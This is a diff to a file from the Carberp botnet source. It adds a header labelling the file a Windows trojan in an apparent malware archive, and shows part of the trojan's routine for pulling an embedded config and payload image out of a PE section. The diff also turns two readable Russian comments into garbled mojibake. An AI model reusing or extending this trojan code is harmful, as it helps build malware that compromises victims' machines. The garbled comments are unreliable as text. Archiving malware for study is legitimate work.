@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <intrin.h>
 #include <stdio.h>
 #include <windows.h>
@@ -160,10 +171,10 @@ BOOLEAN SecCfg::GetSectionConfig(PSECTION_CONFIG SectionConfig, PVOID Image)
 	{
 		ConfigHeader = MAKE_PTR(Image, SectionHeader->VirtualAddress, PSECTION_CONFIG_RAW);
 
-		// Копируем рав конфиг там размер имейджа и конфига
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		CopyMemory(&SectionConfig->Raw, ConfigHeader, sizeof(SECTION_CONFIG_RAW));
 
-		// Указатели на имейдж и конфиг
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		SectionConfig->Config = RtlOffsetToPointer(ConfigHeader, sizeof(SECTION_CONFIG_RAW));
 		SectionConfig->Image = RtlOffsetToPointer(ConfigHeader, sizeof(SECTION_CONFIG_RAW) + ConfigHeader->ConfigSize);
 
